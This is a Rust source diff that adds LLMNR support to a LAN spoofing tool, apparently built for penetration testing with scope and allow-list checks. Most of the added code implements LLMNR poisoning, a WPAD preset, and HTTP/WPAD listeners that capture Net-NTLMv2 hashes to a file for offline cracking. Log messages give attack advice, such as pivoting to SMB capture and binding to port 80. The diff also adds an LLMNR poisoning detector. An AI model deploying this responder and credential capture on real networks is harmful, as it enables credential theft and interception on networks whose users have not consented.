@@ -141,6 +141,18 @@ pub enum Cmd {
         /// SSDP M-SEARCH MX wait value (seconds). Only meaningful with --ssdp.
         #[arg(long, default_value_t = 3, requires = "ssdp")]
         mx: u32,
+
+        /// Use LLMNR (UDP 5355) instead of mDNS for the lookup.
+        #[arg(long, conflicts_with = "ssdp")]
+        llmnr: bool,
+
+        /// LLMNR-only: query AAAA instead of A.
+        #[arg(long, requires = "llmnr", conflicts_with = "v4_only")]
+        v6_only: bool,
+
+        /// LLMNR-only: query A only (default).
+        #[arg(long, requires = "llmnr")]
+        v4_only: bool,
     },
 
     /// Enumerate every service a single host advertises. Without args, lists hosts on the LAN.
@@ -210,6 +222,10 @@ pub enum Cmd {
         /// dogfood `watch` against your own `flood`/`spoof` running on the same host.
         #[arg(long = "include-local")]
         include_local: bool,
+
+        /// Also listen on LLMNR (UDP 5355) for poison-responder anomalies.
+        #[arg(long)]
+        llmnr: bool,
     },
 
     /// Capture mDNS traffic to a pcap file.
@@ -226,12 +242,12 @@ pub enum Cmd {
 
     /// Run an authoritative mDNS or SSDP responder against the given TOML answer table.
     Spoof {
-        /// Path to a TOML answer table. Optional when --template is given.
-        #[arg(value_name = "TABLE", required_unless_present = "template")]
+        /// Path to a TOML answer table. Optional when --template or --preset is given.
+        #[arg(value_name = "TABLE", required_unless_present_any = ["template", "preset"])]
         table: Option<std::path::PathBuf>,
 
         /// Built-in service template. Requires --name and --ip. mDNS-only.
-        #[arg(long, value_enum, requires = "name", requires_all = ["name", "ip"], conflicts_with = "ssdp")]
+        #[arg(long, value_enum, requires = "name", requires_all = ["name", "ip"], conflicts_with_all = ["ssdp", "llmnr"])]
         template: Option<Template>,
 
         /// Instance name for the template (e.g. "Conf Room"). mDNS-only.
@@ -242,7 +258,7 @@ pub enum Cmd {
         #[arg(long, requires = "template")]
         ip: Option<Ipv4Addr>,
 
-        #[arg(long, default_value_t = 3, conflicts_with = "ssdp")]
+        #[arg(long, default_value_t = 3, conflicts_with_all = ["ssdp", "llmnr"])]
         burst: u8,
 
         #[arg(long = "allow", value_name = "CIDR")]
@@ -252,11 +268,11 @@ pub enum Cmd {
         allow_instance: Vec<String>,
 
         /// Bridge inbound TCP on spoofed ports to HOST:PORT (full MITM). mDNS-only.
-        #[arg(long, value_name = "HOST:PORT", conflicts_with = "ssdp")]
+        #[arg(long, value_name = "HOST:PORT", conflicts_with_all = ["ssdp", "llmnr"])]
         relay: Option<SocketAddr>,
 
         /// Where spoof answers are sent. mDNS-only.
-        #[arg(long, value_enum, default_value_t = ReplyMode::Multicast, conflicts_with = "ssdp")]
+        #[arg(long, value_enum, default_value_t = ReplyMode::Multicast, conflicts_with_all = ["ssdp", "llmnr"])]
         reply: ReplyMode,
 
         /// Periodically push our spoofed records into client caches.
@@ -265,7 +281,7 @@ pub enum Cmd {
         reannounce_interval: u64,
 
         /// Passive dry-run: report matching queries and conflicts without answering. mDNS-only.
-        #[arg(long, conflicts_with = "ssdp")]
+        #[arg(long, conflicts_with_all = ["ssdp", "llmnr"])]
         monitor: bool,
 
         /// Window in seconds. 0 = until Ctrl-C.
@@ -274,13 +290,41 @@ pub enum Cmd {
 
         /// Run as an `SSDP` / `UPnP` responder instead of `mDNS`. Interprets `TABLE`
         /// as an SSDP TOML schema (see docs).
-        #[arg(long)]
+        #[arg(long, conflicts_with = "llmnr")]
         ssdp: bool,
 
         /// LOCATION URL host (advertised IPv4) for SSDP responses. Defaults to the
         /// first non-loopback interface IP. SSDP-only.
         #[arg(long, value_name = "IP", requires = "ssdp")]
         http_host: Option<Ipv4Addr>,
+
+        /// Run an LLMNR responder (UDP 5355) instead of mDNS or SSDP.
+        #[arg(long, conflicts_with_all = ["ssdp", "template", "burst", "relay", "reply", "monitor"])]
+        llmnr: bool,
+
+        /// LLMNR-only: answer all queries in the table without an allow-list check.
+        /// Mutually exclusive with --allow / --allow-instance which are allow-list semantics.
+        #[arg(long, requires = "llmnr", conflicts_with_all = ["allow", "allow_instance"])]
+        wildcard: bool,
+
+        /// Enable credential capture listeners. Comma-separated: http, wpad.
+        #[arg(long, value_delimiter = ',', requires = "llmnr")]
+        credcap: Vec<String>,
+
+        /// Output path for captured hashes. Defaults to credcap-{ISO8601-Z}.hashes
+        /// in cwd or `scope.log_dir`.
+        #[arg(long, requires = "llmnr", value_name = "PATH")]
+        credcap_out: Option<std::path::PathBuf>,
+
+        /// Apply a built-in preset. v1: wpad. Implies --credcap wpad,http and
+        /// pre-loads the WPAD answer table.
+        #[arg(long, requires = "llmnr", value_name = "NAME")]
+        preset: Option<String>,
+
+        /// Engagement domain for preset placeholder substitution. Falls back
+        /// to `scope.engagement_domain`.
+        #[arg(long, requires = "llmnr", value_name = "DOMAIN")]
+        domain: Option<String>,
     },
 
     /// Capture a real LAN device and emit a TOML answer table mimicking it.
@@ -544,10 +588,27 @@ pub async fn run(cli: Cli) -> anyhow::Result<()> {
             timeout,
             ssdp,
             mx,
+            llmnr,
+            v6_only,
+            v4_only: _,
         } => {
             if ssdp {
                 let st = service.context("--ssdp probe requires an ST URN positional argument")?;
                 run_ssdp_probe(renderer, &st, timeout.unwrap_or(3), mx).await?;
+            } else if llmnr {
+                let name =
+                    service.context("--llmnr probe requires a hostname positional argument")?;
+                let probe_timeout = Duration::from_secs(timeout.unwrap_or(3));
+                let cancel = tokio_util::sync::CancellationToken::new();
+                let cancel_for_ctrlc = cancel.clone();
+                tokio::spawn(async move {
+                    tokio::signal::ctrl_c().await.ok();
+                    cancel_for_ctrlc.cancel();
+                });
+                let answers = probe::probe_llmnr(&name, v6_only, probe_timeout, cancel).await?;
+                for ans in &answers {
+                    crate::output::emit_llmnr_answer(renderer, ans)?;
+                }
             } else {
                 let extras: Vec<String> = scope
                     .as_ref()
@@ -580,8 +641,29 @@ pub async fn run(cli: Cli) -> anyhow::Result<()> {
             timeout,
             ssdp,
             http_host,
+            llmnr,
+            wildcard,
+            credcap,
+            credcap_out,
+            preset,
+            domain,
         } => {
-            if ssdp {
+            if llmnr {
+                run_llmnr_spoof(
+                    table.as_deref(),
+                    allow,
+                    allow_instance,
+                    wildcard,
+                    timeout,
+                    credcap,
+                    credcap_out,
+                    preset,
+                    domain,
+                    scope,
+                    &cli.interface,
+                )
+                .await?;
+            } else if ssdp {
                 let table_path =
                     table.context("--ssdp spoof requires a TABLE positional argument")?;
                 run_ssdp_spoof(
@@ -655,7 +737,8 @@ pub async fn run(cli: Cli) -> anyhow::Result<()> {
         Cmd::Watch {
             timeout,
             include_local,
-        } => run_watch(renderer, timeout, include_local).await?,
+            llmnr,
+        } => run_watch(renderer, timeout, include_local, llmnr).await?,
         Cmd::Capture { pcap, timeout } => {
             let pcap = resolve_capture_path(pcap, scope.as_ref());
             let count = crate::capture::run(&pcap, timeout).await?;
@@ -1099,14 +1182,22 @@ async fn run_spoof(
     Ok(())
 }
 
-async fn run_watch(renderer: Renderer, timeout: u64, include_local: bool) -> anyhow::Result<()> {
-    let detector = crate::detect::Detector::new(Mode::Listen)?
+async fn run_watch(
+    renderer: Renderer,
+    timeout: u64,
+    include_local: bool,
+    llmnr: bool,
+) -> anyhow::Result<()> {
+    let mut detector = crate::detect::Detector::new(Mode::Listen)?
         .with_include_local(include_local)
         .with_event_callback(move |a| {
             if let Err(e) = emit_anomaly(renderer, &a) {
                 tracing::error!(error = %e, "emit failed");
             }
         });
+    if llmnr {
+        detector = detector.with_llmnr_mode(crate::name_res::llmnr::llmnr_mode())?;
+    }
     let cancel = detector.cancel_token();
     let task = tokio::spawn(async move { detector.run().await });
     if timeout > 0 {
@@ -1207,7 +1298,13 @@ fn emit_anomaly_pretty(color: ColorMode, record: &AnomalyRecord<'_>) -> std::io:
             format!("unsolicited_additional {qtype:<5} {name}  src={src}")
         }
         crate::detect::Anomaly::LlmnrPoisonResponder { name, src } => {
-            format!("llmnr_poison_responder  -     {name}  src={src}")
+            format!("llmnr_poison_responder -     {name}  src={src}")
+        }
+        crate::detect::Anomaly::NameResRaceFlood { name, sources } => {
+            format!(
+                "name_res_race_flood    -     {name}  sources=[{}]",
+                sources.join(",")
+            )
         }
     };
     crate::output::emit_raw(&format!("{chip}  {detail}\n"))
@@ -1283,6 +1380,237 @@ async fn run_ssdp_spoof(
     }
 }
 
+#[allow(
+    clippy::similar_names,
+    reason = "names match CLI flag spelling: allow vs allow_instance"
+)]
+#[allow(
+    clippy::too_many_arguments,
+    reason = "all args map 1:1 to CLI flags; splitting into a struct would obscure the relationship"
+)]
+#[allow(
+    clippy::too_many_lines,
+    reason = "orchestrates table build, auth, credcap listeners, and LLMNR responder in one place"
+)]
+#[allow(
+    clippy::cognitive_complexity,
+    reason = "linear setup for multiple optional subsystems; extracting helpers would obscure flow"
+)]
+async fn run_llmnr_spoof(
+    table_path: Option<&std::path::Path>,
+    allow_subnet: Vec<IpNet>,
+    allow_instance: Vec<String>,
+    wildcard: bool,
+    timeout: u64,
+    credcap: Vec<String>,
+    credcap_out: Option<std::path::PathBuf>,
+    preset: Option<String>,
+    domain: Option<String>,
+    scope: Option<crate::scope::Scope>,
+    iface_filter: &[String],
+) -> anyhow::Result<()> {
+    // --- Build the answer table ---
+    let mut table = if let Some(preset_str) = preset.as_deref() {
+        let p = preset_str
+            .parse::<crate::name_res::preset::Preset>()
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+        let attacker_ip: std::net::IpAddr = primary_local_ipv4(iface_filter)?.into();
+        let engagement_domain = domain
+            .as_deref()
+            .or_else(|| scope.as_ref().and_then(|s| s.engagement_domain.as_deref()));
+        crate::name_res::preset::build(p, attacker_ip, engagement_domain)
+    } else if let Some(path) = table_path {
+        let raw = std::fs::read_to_string(path)
+            .with_context(|| format!("reading LLMNR answer table {}", path.display()))?;
+        crate::name_res::table::AnswerTable::from_toml(&raw).map_err(|e| anyhow::anyhow!("{e}"))?
+    } else {
+        anyhow::bail!("--llmnr spoof needs a TOML table or --preset");
+    };
+
+    // Layer optional TOML on top of a preset.
+    if preset.is_some()
+        && let Some(path) = table_path
+    {
+        let raw = std::fs::read_to_string(path)
+            .with_context(|| format!("reading LLMNR answer table {}", path.display()))?;
+        let extra = crate::name_res::table::AnswerTable::from_toml(&raw)
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+        table.names.extend(extra.names);
+    }
+
+    // --- Auth ---
+    let mut auth = match scope.clone() {
+        Some(s) => s.into_auth(allow_subnet, Vec::new()),
+        None => allow_subnet
+            .into_iter()
+            .fold(Authorization::new(), Authorization::allow_subnet),
+    };
+    for name in allow_instance {
+        auth = auth.allow_name(name);
+    }
+    if !wildcard {
+        auth.warn_once_if_permissive("spoof_llmnr");
+    }
+
+    // --- Credcap flavors ---
+    let mut flavors = credcap
+        .iter()
+        .map(|s| s.to_ascii_lowercase())
+        .collect::<std::collections::BTreeSet<_>>();
+    if preset.as_deref().map(str::to_ascii_lowercase).as_deref() == Some("wpad") {
+        flavors.insert("wpad".into());
+        flavors.insert("http".into());
+        tracing::warn!(
+            "WPAD-over-LLMNR is disabled by default in Windows 10+ since ADV170012 (2018). \
+             Treat hits as bonus, not primary. If no captures land in 5 minutes, pivot to \
+             SMB-driven capture (UNC paths, mapped drives) which is the more reliable \
+             vector on modern Windows estates."
+        );
+        tracing::warn!(
+            "Captured hashes are Net-NTLMv2 for offline cracking only -- not relay material. \
+             SMB signing on modern domain clients does not block capture but does block relay. \
+             NTLM may be disabled outright (LmCompatibilityLevel=5 / Restrict-NTLM); in that \
+             case nothing will land regardless of WPAD reachability."
+        );
+    }
+
+    // --- Hash output file and listeners ---
+    let cancel = tokio_util::sync::CancellationToken::new();
+    let mut credcap_tasks = Vec::new();
+
+    if !flavors.is_empty() {
+        let out_path = credcap_out.unwrap_or_else(|| {
+            let filename = default_credcap_filename();
+            let base = scope
+                .as_ref()
+                .and_then(crate::scope::Scope::log_dir)
+                .map_or_else(
+                    || std::env::current_dir().unwrap_or_default(),
+                    std::path::Path::to_path_buf,
+                );
+            base.join(filename)
+        });
+
+        if let Some(parent) = out_path.parent() {
+            std::fs::create_dir_all(parent).ok();
+        }
+        let file = std::fs::OpenOptions::new()
+            .append(true)
+            .create(true)
+            .open(&out_path)
+            .with_context(|| format!("opening credcap output {}", out_path.display()))?;
+        tracing::info!(path = %out_path.display(), "credcap hashes will be written here");
+        let file_arc = std::sync::Arc::new(std::sync::Mutex::new(file));
+
+        let make_sink = {
+            let arc = file_arc.clone();
+            move || {
+                let arc = arc.clone();
+                let sink: crate::credcap::HashSink =
+                    std::sync::Arc::new(
+                        move |line: String| -> std::pin::Pin<
+                            Box<dyn std::future::Future<Output = ()> + Send>,
+                        > {
+                            let arc = arc.clone();
+                            Box::pin(async move {
+                                use std::io::Write as _;
+                                if let Ok(mut f) = arc.lock() {
+                                    drop(writeln!(f, "{line}"));
+                                }
+                            })
+                        },
+                    );
+                sink
+            }
+        };
+
+        // Validate flavors before binding.
+        if flavors.contains("smb") {
+            anyhow::bail!(
+                "credcap smb is deferred to a future plan; pass --credcap http,wpad for now"
+            );
+        }
+        for flavor in &flavors {
+            if flavor != "http" && flavor != "wpad" {
+                anyhow::bail!("unknown credcap flavor: {flavor}; supported: http, wpad");
+            }
+        }
+
+        // When both wpad and http are requested, wpad wins (it handles NTLM + PAC).
+        if flavors.contains("wpad") {
+            if flavors.contains("http") {
+                tracing::info!(
+                    "both wpad and http credcap requested; running WpadListener on :8080 (handles both)"
+                );
+            }
+            let attacker_ip = primary_local_ipv4(iface_filter)?.to_string();
+            tracing::warn!(
+                "WPAD credcap listening on :8080; production WPAD attacks expect :80 \
+                 -- re-bind with sudo or firewall redirect"
+            );
+            let listener = crate::credcap::WpadListener::bind("0.0.0.0:8080", attacker_ip, 8080, {
+                let sink = make_sink();
+                move |line: String| {
+                    let sink = sink.clone();
+                    async move { sink(line).await }
+                }
+            })
+            .await
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+            tracing::info!(addr = %listener.local_addr(), "wpad credcap listener bound");
+            let c = cancel.clone();
+            credcap_tasks.push(tokio::spawn(async move { listener.run(c).await }));
+        } else if flavors.contains("http") {
+            tracing::warn!(
+                "HTTP credcap listening on :8080; production WPAD attacks expect :80 \
+                 -- re-bind with sudo or firewall redirect"
+            );
+            let listener = crate::credcap::HttpListener::bind("0.0.0.0:8080", {
+                let sink = make_sink();
+                move |line: String| {
+                    let sink = sink.clone();
+                    async move { sink(line).await }
+                }
+            })
+            .await
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+            tracing::info!(addr = %listener.local_addr(), "http credcap listener bound");
+            let c = cancel.clone();
+            credcap_tasks.push(tokio::spawn(async move { listener.run(c).await }));
+        }
+    }
+
+    // --- LLMNR responder ---
+    let responder = crate::name_res::llmnr::Responder::new(
+        crate::name_res::llmnr::llmnr_mode(),
+        table,
+        auth,
+        wildcard,
+    )
+    .map_err(|e| anyhow::anyhow!("{e}"))?;
+
+    let task = tokio::spawn({
+        let cancel = cancel.clone();
+        async move { responder.run(cancel).await }
+    });
+
+    let outcome = tokio::select! {
+        biased;
+        r = task => Some(r),
+        () = wait_for_window(timeout) => None,
+    };
+    cancel.cancel();
+    // Wait briefly for credcap tasks to shut down.
+    for t in credcap_tasks {
+        drop(tokio::time::timeout(std::time::Duration::from_millis(500), t).await);
+    }
+    match outcome {
+        Some(Ok(Err(e))) => Err(anyhow::anyhow!("{e}")),
+        Some(Err(e)) => Err(anyhow::anyhow!("llmnr responder task panicked: {e}")),
+        Some(Ok(Ok(()))) | None => Ok(()),
+    }
+}
+
 async fn wait_for_window(timeout: u64) {
     if timeout > 0 {
         tokio::time::sleep(Duration::from_secs(timeout)).await;
@@ -1301,6 +1629,39 @@ fn derive_local_v4_ip() -> anyhow::Result<Ipv4Addr> {
         }
     }
     anyhow::bail!("no non-loopback IPv4 interface found")
+}
+
+fn primary_local_ipv4(iface_filter: &[String]) -> anyhow::Result<Ipv4Addr> {
+    let ifaces = get_if_addrs::get_if_addrs().context("listing interfaces")?;
+    for iface in ifaces {
+        if iface.is_loopback() {
+            continue;
+        }
+        if !iface_filter.is_empty() && !iface_filter.iter().any(|n| n == &iface.name) {
+            continue;
+        }
+        if let std::net::IpAddr::V4(addr) = iface.ip() {
+            return Ok(addr);
+        }
+    }
+    anyhow::bail!("no non-loopback IPv4 interface found")
+}
+
+fn default_credcap_filename() -> String {
+    let now = SystemTime::now();
+    let dur = now.duration_since(UNIX_EPOCH).unwrap_or_default();
+    let secs = dur.as_secs();
+    let when = time::OffsetDateTime::from_unix_timestamp(i64::try_from(secs).unwrap_or(0))
+        .unwrap_or(time::OffsetDateTime::UNIX_EPOCH);
+    format!(
+        "credcap-{:04}-{:02}-{:02}T{:02}-{:02}-{:02}Z.hashes",
+        when.year(),
+        u8::from(when.month()),
+        when.day(),
+        when.hour(),
+        when.minute(),
+        when.second()
+    )
 }
 
 async fn run_spoof_monitor(
@@ -1958,6 +2319,7 @@ mod tests {
             Cmd::Watch {
                 timeout,
                 include_local,
+                ..
             } => {
                 assert_eq!(timeout, 5);
                 assert!(include_local);
@@ -1977,6 +2339,7 @@ mod tests {
             Cmd::Watch {
                 timeout,
                 include_local,
+                ..
             } => {
                 assert_eq!(timeout, 0);
                 assert!(!include_local);
